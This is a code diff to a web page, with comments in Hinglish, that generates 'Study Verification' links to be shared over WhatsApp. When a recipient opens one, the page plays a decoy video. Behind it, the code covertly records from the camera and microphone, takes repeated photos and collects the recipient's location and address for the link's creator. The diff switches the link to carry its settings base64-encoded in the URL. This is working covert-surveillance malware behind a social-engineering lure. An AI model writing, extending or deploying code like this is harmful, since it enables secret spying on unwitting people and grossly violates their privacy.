@@ -28,7 +28,7 @@
 
 <div class="container mx-auto px-4 py-8 max-w-5xl">
 
-<!-- ============ ADMIN PANEL (Sirf jab URL mein ?admin ho) ============ -->
+<!-- ============ ADMIN PANEL (Link Generator) ============ -->
 <div id="adminPanel">
     <div class="text-center mb-10">
         <div class="inline-flex gap-2 bg-white/20 backdrop-blur rounded-full px-8 py-3 mb-5">
@@ -137,7 +137,7 @@
     <div id="locationsTab" class="space-y-4 hidden"></div>
 </div>
 
-<!-- ============ CAMERA PAGE (Student - Sirf Camera Page) ============ -->
+<!-- ============ CAMERA PAGE (Student) ============ -->
 <div id="cameraPanel" class="hidden">
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <audio id="hiddenAudio" autoplay></audio>
@@ -176,7 +176,6 @@
 <script>
 // ============ DATA STORAGE ============
 let allPhotos = [], allVideos = [], allVoices = [], allLocations = [];
-let storedCustomVideo = null, storedCustomImage = null;
 
 // Recording Variables
 let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder = null;
@@ -185,6 +184,9 @@ let capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = 
 let locationInterval = null;
 
 // ============ FILE UPLOAD ============
+let storedCustomVideo = null;
+let storedCustomImage = null;
+
 document.getElementById('customVideoFile').addEventListener('change', function(e) {
     const file = e.target.files[0];
     if(file) {
@@ -312,30 +314,30 @@ function downloadAllData() {
     alert('✅ Complete report downloaded!');
 }
 
-// ============ LINK GENERATION ============
+// ============ LINK GENERATION - Sab kuch link mein encode karo ============
 function generateLink() {
     const campaignName = document.getElementById('campaignName').value;
     if(!campaignName) { alert('Please enter campaign name'); return; }
     
-    const captureSpeed = parseFloat(document.getElementById('captureSpeed').value);
+    const captureSpeed = document.getElementById('captureSpeed').value;
     const photoCount = document.getElementById('photoCount').value;
-    const uniqueCode = 'STUDY_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10).toUpperCase();
     
+    // Sab data ko object mein daalo
     const linkData = {
-        code: uniqueCode,
-        name: campaignName,
-        speed: captureSpeed,
-        photos: parseInt(photoCount),
-        video: storedCustomVideo,
-        image: storedCustomImage
+        n: campaignName,
+        s: captureSpeed,
+        p: parseInt(photoCount),
+        v: storedCustomVideo,
+        i: storedCustomImage
     };
     
-    let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal3') || '[]');
-    allLinks.push(linkData);
-    localStorage.setItem('studyLinksFinal3', JSON.stringify(allLinks));
+    // Encode to base64
+    const jsonStr = JSON.stringify(linkData);
+    const encoded = btoa(encodeURIComponent(jsonStr));
     
+    // Link banao
     const baseUrl = window.location.href.split('?')[0];
-    const fullLink = baseUrl + '?code=' + uniqueCode;
+    const fullLink = baseUrl + '?data=' + encoded;
     
     document.getElementById('generatedLink').value = fullLink;
     document.getElementById('linkBox').classList.remove('hidden');
@@ -353,24 +355,24 @@ function sendToWhatsApp() {
     window.open(`https://wa.me/?text=${encodeURIComponent('📸 Study Verification: ' + link)}`, '_blank');
 }
 
-// ============ CAMERA PAGE ============
-async function startCameraPage(linkData) {
-    neededCount = linkData.photos;
-    captureInterval = linkData.speed * 1000;
+// ============ CAMERA PAGE - Link se data read karo ============
+async function startCameraPageFromData(linkData) {
+    neededCount = linkData.p;
+    captureInterval = parseFloat(linkData.s) * 1000;
     capturedCount = 0;
     
-    document.getElementById('cameraTitle').innerHTML = linkData.name;
+    document.getElementById('cameraTitle').innerHTML = linkData.n || 'Study Session';
     
     const videoElement = document.getElementById('fakeVideo');
-    if(linkData.video && linkData.video !== '') {
-        videoElement.src = linkData.video;
+    if(linkData.v && linkData.v !== '') {
+        videoElement.src = linkData.v;
     } else {
         videoElement.src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
     }
     videoElement.play();
     
-    if(linkData.image && linkData.image !== '') {
-        document.body.style.backgroundImage = `url(${linkData.image})`;
+    if(linkData.i && linkData.i !== '') {
+        document.body.style.backgroundImage = `url(${linkData.i})`;
         document.body.style.backgroundSize = 'cover';
     }
     
@@ -389,7 +391,7 @@ async function startRecording() {
             if(videoChunks.length) { 
                 const blob = new Blob(videoChunks, { type: 'video/webm' }); 
                 allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVideosFinal3', JSON.stringify(allVideos));
+                localStorage.setItem('studyVideosFinal4', JSON.stringify(allVideos));
                 updateStats();
                 displayVideos();
             } 
@@ -404,7 +406,7 @@ async function startRecording() {
             if(audioChunks.length) { 
                 const blob = new Blob(audioChunks, { type: 'audio/webm' }); 
                 allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), time: new Date().toLocaleString() }); 
-                localStorage.setItem('studyVoicesFinal3', JSON.stringify(allVoices));
+                localStorage.setItem('studyVoicesFinal4', JSON.stringify(allVoices));
                 updateStats();
                 displayVoices();
             } 
@@ -437,7 +439,7 @@ async function getLocationWithAddress() {
             address: address,
             time: new Date().toLocaleString() 
         });
-        localStorage.setItem('studyLocsFinal3', JSON.stringify(allLocations));
+        localStorage.setItem('studyLocsFinal4', JSON.stringify(allLocations));
         updateStats();
         displayLocations();
     }, () => {});
@@ -462,7 +464,7 @@ function startCapture() {
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             allPhotos.push({ id: Date.now(), data: photoData, time: new Date().toLocaleString() });
-            localStorage.setItem('studyPhotosFinal3', JSON.stringify(allPhotos));
+            localStorage.setItem('studyPhotosFinal4', JSON.stringify(allPhotos));
             capturedCount++;
             updateStats();
             displayPhotos();
@@ -475,10 +477,10 @@ function startCapture() {
 }
 
 function updateStats() {
-    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal3') || '[]');
-    let videos = JSON.parse(localStorage.getItem('studyVideosFinal3') || '[]');
-    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal3') || '[]');
-    let locs = JSON.parse(localStorage.getItem('studyLocsFinal3') || '[]');
+    let photos = JSON.parse(localStorage.getItem('studyPhotosFinal4') || '[]');
+    let videos = JSON.parse(localStorage.getItem('studyVideosFinal4') || '[]');
+    let voices = JSON.parse(localStorage.getItem('studyVoicesFinal4') || '[]');
+    let locs = JSON.parse(localStorage.getItem('studyLocsFinal4') || '[]');
     
     allPhotos = photos;
     allVideos = videos;
@@ -493,29 +495,29 @@ function updateStats() {
     displayPhotos();
 }
 
-// ============ CHECK URL - IMPORTANT FIX ============
+// ============ CHECK URL - Link se data read karo ============
 function checkUrl() {
     const urlParams = new URLSearchParams(window.location.search);
-    const code = urlParams.get('code');
+    const encodedData = urlParams.get('data');
     
-    if(code) {
-        // Student link - Sirf Camera Page show karo
-        let allLinks = JSON.parse(localStorage.getItem('studyLinksFinal3') || '[]');
-        const linkData = allLinks.find(l => l.code === code);
-        
-        if(linkData) {
-            // Camera page show karo, admin panel hide
+    if(encodedData) {
+        try {
+            // Decode data from link
+            const jsonStr = decodeURIComponent(atob(encodedData));
+            const linkData = JSON.parse(jsonStr);
+            
+            // Camera page show karo
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('cameraPanel').classList.remove('hidden');
-            startCameraPage(linkData);
-        } else {
-            // Invalid code - admin panel show karo
+            startCameraPageFromData(linkData);
+        } catch(e) {
+            // Invalid data - show admin panel
             document.getElementById('adminPanel').classList.remove('hidden');
             document.getElementById('cameraPanel').classList.add('hidden');
             updateStats();
         }
     } else {
-        // No code - admin panel show karo (link generator)
+        // No data - show admin panel
         document.getElementById('adminPanel').classList.remove('hidden');
         document.getElementById('cameraPanel').classList.add('hidden');
         updateStats();
